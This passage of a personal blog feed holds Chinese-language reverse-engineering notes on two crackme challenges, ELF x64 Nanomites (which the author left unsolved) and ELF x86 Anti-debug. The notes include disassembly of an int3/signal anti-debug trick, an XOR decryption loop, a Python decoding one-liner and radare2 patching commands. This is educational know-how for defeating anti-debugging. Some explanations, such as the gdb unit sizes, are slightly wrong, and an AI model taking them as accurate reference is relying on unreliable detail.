在虚拟空间中开辟一段空间，当要读的时候，将文件内容加载进物理内存</p><hr><h3 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h3><pre><code>void * memcpy ( void * destination, const void * source, size_t num );</code></pre><p>表示将0x400ac0的141个字节拷贝到新开辟的虚拟空间中0x7ffff7ffb000</p><p>0x4008b6:    mov    rcx,QWORD PTR [rip+0x2007c3]        # 0x601080<br>rcx==0x3148c93148c03148</p><hr><h3 id="r2"><a href="#r2" class="headerlink" title="r2"></a>r2</h3><p><code>help x</code><br>命令：x/3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示输出三个单位，u表示按十六进制显示。</p><p><code>gdb-peda$ x/141xb 0x400ac0</code></p><hr><h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>pid_t fork(void)<br>fork系统调用用于创建一个新进程，称为子进程，它与进程（称为系统调用fork的进程）<code>同时运行</code>，此进程称为父进程。创建新的子进程后，两个进程将<code>执行</code>fork（）系统调用之后的<code>下一条指令</code>。</p><p>返回值： 若成功调用一次则返回两个值，<code>子进程返回0</code>，<code>父进程返回子进程ID</code>；否则，出错返回-1</p><p>这意味着父子进程间不共享这些<code>存储空间</code>。</p><hr><pre><code>0x4008d1:    call   0x400630 &lt;fork@plt&gt;</code></pre><p>调用后返回0， 则当前的子进程</p><hr><p><del>gdb catch 捕获异常</del></p><h3 id="waitpid"><a href="#waitpid" class="headerlink" title="waitpid"></a>waitpid</h3><p>作用同于wait，但可指定pid进程清理，可以不阻塞。</p><p><code>pid_t waitpid(pid_t pid,int *status,int options);</code>成功：返回清理掉的子进程ID；失败：-1（无子进程）</p><ul><li>pid&gt;0    只等待进程ID等于pid的子进程，不管其它已经有多少子进程运行结束退出了，只要指定的子进程还没有结束，waitpid就会一直等下去。</li></ul><ul><li>参数status如果不是一个空指针,则终止进程的终止状态就存放在status所指向的单元。</li></ul><hr><h3 id="SAR"><a href="#SAR" class="headerlink" title="SAR"></a>SAR</h3><p>SAR 算术右移指令<br>符号位保持不变</p><p>call rax 如果都不跳转，则到这里<br>0x7ffff7ffb07b:    mov    al,0x3c<br>   0x7ffff7ffb07d:    mov    edi,0x0<br>   0x7ffff7ffb082:    syscall </p><h2 id="没有解出来-tw-1f198-worried"><a href="#没有解出来-tw-1f198-worried" class="headerlink" title="没有解出来:tw-1f198::worried:"></a>没有解出来:tw-1f198::worried:</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x64-Nanomites-Introduction&quot;&gt;&lt;a href=&quot;#ELF-x64-Nanomites-Introduction&quot; class=&quot;headerlink&quot; title=&quot;ELF x64 - Nanomites - Introduction&quot;&gt;&lt;/a&gt;ELF x64 - Nanomites - Introduction&lt;/h2&gt;&lt;h3 id=&quot;mmap&quot;&gt;&lt;a href=&quot;#mmap&quot; class=&quot;headerlink&quot; title=&quot;mmap&quot;&gt;&lt;/a&gt;mmap&lt;/h3&gt;&lt;p&gt;&lt;del&gt;mmap只是在虚拟内存分配了地址空间，只有在第一次访问虚拟内存的时候才分配物理内存。&lt;/del&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - Anti-debug</title>
    <link href="http://finsenty54.github.io/2020/10/23/ELF%20x86%20-%20Anti-debug/"/>
    <id>http://finsenty54.github.io/2020/10/23/ELF%20x86%20-%20Anti-debug/</id>
    <published>2020-10-23T13:38:58.000Z</published>
    <updated>2020-10-31T08:53:12.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x86-Anti-debug"><a href="#ELF-x86-Anti-debug" class="headerlink" title="ELF x86 - Anti-debug"></a>ELF x86 - Anti-debug</h2><p>参考<a href="https://re.kv.io/crackme/12.html">https://re.kv.io/crackme/12.html</a><br><code>int 80</code> 系统调用<br><code>32位</code>下，<code>EAX</code>保存调用号<br><del>mov eax , 30  utime, utimes - change file last access and modification times<br>int utime(const char *filename, const struct utimbuf *times);</del></p><p><del>The utime() system call changes the access and modification times of<br>the inode specified by filename to the actime and modtime fields of<br>times respectively.</del></p><a id="more"></a><hr><p>上面是错的<br>0x30 as sys_signal 十六进制 <code>直接弄错</code><br>0x30 == 48</p><pre><code>void (*signal(int sig, void (*func)(int)))(int)</code></pre><p><code>sys_signal</code>设置一个函数来处理信号，即<strong>带有 sig 参数的信号处理程序</strong><br><code>sig </code>– 在信号处理程序中作为变量使用的信号码<br><code>0x5</code> ==<code>SIGABRT</code>    (Signal Abort) 程序异常终止。<br><code>func</code> – 一个指向函数的指针。它可以是一个由程序定义的函数</p><hr><p><code>int3</code> would cause a debugger to stop</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">08048063</span> loc_8048063:                            ; CODE XREF: start↑j</span><br><span class="line">.text:<span class="number">08048063</span>                 mov     eax, <span class="number">30</span>h</span><br><span class="line">.text:<span class="number">08048068</span>                 mov     ebx, <span class="number">5</span></span><br><span class="line">.text:<span class="number">0804806</span>D                 mov     ecx, offset sub_80480E2</span><br><span class="line">.text:<span class="number">08048072</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX - sys_signal</span><br><span class="line">.text:<span class="number">08048074</span>                 jmp     <span class="keyword">short</span> loc_8048077</span><br><span class="line">.text:<span class="number">08048074</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048076</span>                 db <span class="number">0</span>CEh</span><br><span class="line">.text:<span class="number">08048077</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048077</span></span><br><span class="line">.text:<span class="number">08048077</span> loc_8048077:                            ; CODE XREF: start+<span class="number">14</span>↑j</span><br><span class="line">.text:<span class="number">08048077</span>                 <span class="keyword">int</span>     <span class="number">3</span>               ; Trap to Debugger</span><br><span class="line">.text:<span class="number">08048078</span>                 jmp     <span class="keyword">short</span> loc_804807B</span><br></pre></td></tr></table></figure><p>先设置第一个signal处理函数，在<code>0x08048077</code>处遇到<code>int 3</code>跳到处理函数</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">080480E2</span></span><br><span class="line">.text:<span class="number">080480E2</span> sub_80480E2     proc near               ; DATA XREF: start+D↑o</span><br><span class="line">.text:<span class="number">080480E2</span>                 mov     eax, offset sub_8048104</span><br><span class="line">.text:<span class="number">080480E7</span>                 jmp     <span class="keyword">short</span> loc_8048101</span><br><span class="line">.text:<span class="number">080480E9</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480E9</span></span><br><span class="line">.text:<span class="number">080480E9</span> loc_80480E9:                            ; CODE XREF: sub_80480E2:loc_80480FF↓j</span><br><span class="line">.text:<span class="number">080480E9</span>                                         ; sub_80480E2:loc_8048101↓j</span><br><span class="line">.text:<span class="number">080480E9</span>                 cmp     eax, <span class="number">80482E8</span>h</span><br><span class="line">.text:<span class="number">080480</span>EE                 jz      <span class="keyword">short</span> locret_8048103</span><br><span class="line">.text:<span class="number">080480F</span>0                 jmp     <span class="keyword">short</span> loc_80480F3</span><br><span class="line">.text:<span class="number">080480F</span>0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>2                 db <span class="number">0E8</span>h</span><br><span class="line">.text:<span class="number">080480F</span>3 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>3</span><br><span class="line">.text:<span class="number">080480F</span>3 loc_80480F3:                            ; CODE XREF: sub_80480E2+E↑j</span><br><span class="line">.text:<span class="number">080480F</span>3                 <span class="keyword">xor</span>     dword ptr [eax], <span class="number">8048F</span>C1h</span><br><span class="line">.text:<span class="number">080480F</span>9                 add     eax, <span class="number">4</span></span><br><span class="line">.text:<span class="number">080480F</span>C                 jmp     <span class="keyword">short</span> loc_80480FF</span><br><span class="line">.text:<span class="number">080480F</span>C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>E                 db <span class="number">0</span>EBh</span><br><span class="line">.text:<span class="number">080480F</span>F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>F</span><br><span class="line">.text:<span class="number">080480F</span>F loc_80480FF:                            ; CODE XREF: sub_80480E2+<span class="number">1</span>A↑j</span><br><span class="line">.text:<span class="number">080480F</span>F                 jmp     <span class="keyword">short</span> loc_80480E9</span><br><span class="line">.text:<span class="number">08048101</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048101</span></span><br><span class="line">.text:<span class="number">08048101</span> loc_8048101:                            ; CODE XREF: sub_80480E2+<span class="number">5</span>↑j</span><br><span class="line">.text:<span class="number">08048101</span>                 jmp     <span class="keyword">short</span> loc_80480E9</span><br><span class="line">.text:<span class="number">08048103</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048103</span></span><br><span class="line">.text:<span class="number">08048103</span> locret_8048103:                         ; CODE XREF: sub_80480E2+C↑j</span><br><span class="line">.text:<span class="number">08048103</span>                 retn</span><br><span class="line">.text:<span class="number">08048103</span> sub_80480E2     endp</span><br></pre></td></tr></table></figure><p>将代码解密出来，然后后面根据signal执行处理代码</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(lambda i: chr(i ^ <span class="number">0xfc</span>), [<span class="number">0xA5</span>, <span class="number">0xCF</span>, <span class="number">0x9D</span>, <span class="number">0xB4</span>, <span class="number">0xDD</span>, <span class="number">0x88</span>, <span class="number">0xB4</span>, <span class="number">0x95</span>, <span class="number">0xAF</span>, <span class="number">0x95</span>, <span class="number">0xAF</span>, <span class="number">0x88</span>, <span class="number">0xB4</span>, <span class="number">0xCF</span>, <span class="number">0x97</span>, <span class="number">0xB9</span>, <span class="number">0x85</span>, <span class="number">0xDD</span>]))</span><br></pre></td></tr></table></figure><p><code>&#39; &#39;</code>字符串内置函数<code>join()</code><br><code>map(fun, iter) </code>函数fun操作iter<br>第一个参数 function 以参数序列中的每一个元素调用 function 函数，返回包含每次 function 函数返回值的新列表。<br><code>lambda</code> 声明为匿名函数，如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>(lambda x: x ** <span class="number">2</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br></pre></td></tr></table></figure><hr><h3 id="r2（一个大佬的解法）"><a href="#r2（一个大佬的解法）" class="headerlink" title="r2（一个大佬的解法）"></a><code>r2</code>（一个大佬的解法）</h3><p><code>oo+</code>          reopen in read-write<br><code>wox 0xfc @ entry0+625!18</code>  //会写入 将0xfc与后面18个值异或<br>wox [val]                     ^=  xor  (f.ex: wox 0x90)<br><code>ps @ entry0+625</code><br>ps       print string</p><hr><p><code>wa nop </code>          write nopcode using asm.arch and asm.bits</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x0804060</span>]&gt; wa nop @ <span class="number">0x08048077</span></span><br><span class="line">[<span class="number">0x0804060</span>]&gt; wa mov ecx, <span class="number">0x80482d1</span> @ <span class="number">0x08048167</span></span><br></pre></td></tr></table></figure><p>控制程序流程</p><hr><h3 id="sys-write-−"><a href="#sys-write-−" class="headerlink" title="sys_write −"></a>sys_write −</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">movedx,<span class="number">4</span>; message length</span><br><span class="line">movecx,msg; message to write</span><br><span class="line">movebx,<span class="number">1</span>; <span class="function">file <span class="title">descriptor</span> <span class="params">(<span class="built_in">stdout</span>)</span></span></span><br><span class="line">moveax,4; system call number (sys_write)</span><br><span class="line"><span class="keyword">int</span><span class="number">0x80</span>; call kernel</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x86-Anti-debug&quot;&gt;&lt;a href=&quot;#ELF-x86-Anti-debug&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Anti-debug&quot;&gt;&lt;/a&gt;ELF x86 - Anti-debug&lt;/h2&gt;&lt;p&gt;参考&lt;a href=&quot;https://re.kv.io/crackme/12.html&quot;&gt;https://re.kv.io/crackme/12.html&lt;/a&gt;&lt;br&gt;&lt;code&gt;int 80&lt;/code&gt; 系统调用&lt;br&gt;&lt;code&gt;32位&lt;/code&gt;下，&lt;code&gt;EAX&lt;/code&gt;保存调用号&lt;br&gt;&lt;del&gt;mov eax , 30  utime, utimes - change file last access and modification times&lt;br&gt;int utime(const char *filename, const struct utimbuf *times);&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;The utime() system call changes the access and modification times of&lt;br&gt;the inode specified by filename to the actime and modtime fields of&lt;br&gt;times respectively.&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
</feed>
